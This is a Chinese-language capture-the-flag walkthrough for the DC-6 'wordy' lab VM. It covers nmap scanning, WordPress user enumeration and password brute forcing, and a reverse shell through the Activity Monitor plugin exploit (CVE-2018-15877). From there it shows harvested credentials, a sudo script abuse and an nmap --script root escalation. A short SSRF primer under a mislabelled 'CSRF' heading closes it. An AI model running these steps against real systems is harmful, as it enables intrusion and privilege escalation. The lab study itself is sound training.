@@ -1,0 +1,219 @@
+VMware双击打开nat模式即可！
+作者要求hosts加入：192.168.253.178 wordy
+
+
+1、nmap 192.168.253.0/24 -sP
+MAC Address: 00:0C:29:48:C6:6D (VMware)
+Nmap scan report for 192.168.253.178
+
+
+2、nmap 192.168.253.178 -p- A -sS -sV -T5
+
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+
+
+3、web信息收集
+
+http://wordy/
+发现又是wordpress站！
+
+wpscan --url http://wordy/ -eu   ---简单枚举
+发现五个用户名：
+admin
+graham
+mark
+sarah
+jens
+
+
+4、暴力破解
+
+前面介绍过！
+wc -l rockyou.txt  
+14344392 rockyou.txt
+
+cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
+这里根据自己的目录定义！！
+减少我们爆破密码的时间，缩小范围！！
+
+wc -l passwords.txt （目前字典数量2668个）
+
+
+项目二十三介绍过wpscan：
+wpscan -U mark -P passwords.txt --url http://wordy
+wpscan -U user.txt -P passwords.txt --max-threads 50 --url http://wordy/
+
+mark
+helpdesk01
+
+或者burpsuite爆破！
+
+通过dirb爆破获得后台：
+http://wordy/wp-admin
+成功登录后台！
+
+
+5、Activity monitor 提权  CVE-2018-15877
+https://www.cvedetails.com/cve/CVE-2018-15877/
+
+谷歌上查询：activity monitor
+https://www.exploit-db.com/exploits/45274
+一旦我们触发了POST请求，我们就会得到一个带有user的反弹shell www-data。
+
+gedit
+
+50行：修改域名
+51行：修改IP
+
+nc -vlp 9999
+file:////root//Desktop/32/45274.html
+获得反弹shell!
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+6、内部信息收集
+
+1）Linux version 4.9.0-8-amd64
+2）Sudo version 1.8.19p1
+3）mysql用户名发现：
+ww/html/wp-config.php
+define( 'DB_NAME', 'wordpressdb' );
+define( 'DB_USER', 'wpdbuser' );
+define( 'DB_PASSWORD', 'meErKatZ' );
+define( 'DB_HOST', 'localhost' );
+
+4）在/home/mark/stuff目录发现：things-to-do.txt
+Add new user: graham - GSo7isUM1D4
+
+
+7、graham内部信息收集-提权
+
+ssh graham@192.168.253.178
+GSo7isUM1D4
+
+sudo -l
+User graham may run the following commands on dc-6:
+    (jens) NOPASSWD: /home/jens/backups.sh
+
+nano写入：/bin/bash
+
+sudo -u jens /home/jens/backups.sh
+成功获得jens权限shell!
+
+
+7、jens内部提权
+
+sudo -l
+ jens may run the following commands on dc-6:
+    (root) NOPASSWD: /usr/bin/nmap
+
+https://gtfobins.github.io/gtfobins/nmap/
+
+
+----
+TF=$(mktemp)
+echo 'os.execute("/bin/sh")' > $TF
+sudo nmap --script=$TF
+----
+
+获得root权限！！
+
+
+
+
+CSRF:
+SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
+
+SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器
+
+
+漏洞出现点:
+1）分享：通过URL地址分享网页内容
+2）转码服务
+3）在线翻译
+4）图片加载与下载：通过URL地址加载或下载图片
+5）图片、文章收藏功能
+6）未公开的api实现以及其他调用URL的功能
+7）从URL关键字中寻找
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
